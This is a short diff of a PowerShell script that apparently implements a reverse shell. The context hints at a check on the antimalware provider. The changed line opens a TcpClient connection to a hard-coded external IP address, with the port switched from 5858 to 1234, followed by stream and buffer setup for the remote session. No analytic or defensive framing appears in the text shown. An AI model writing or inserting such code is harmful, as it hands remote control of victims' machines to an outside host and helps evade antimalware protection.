@@ -34,7 +34,7 @@ while ($AntimalwareProvider -ne 0)
 }
 
 $client = $stream = $buffer = $writer = $data = $result = $null;
-$client = New-Object Net.Sockets.TcpClient("35.244.42.175", 5858);
+$client = New-Object Net.Sockets.TcpClient("35.244.42.175", 1234);
     $stream = $client.GetStream();
     $buffer = New-Object Byte[] 1024;
     $encoding = New-Object Text.UTF8Encoding;
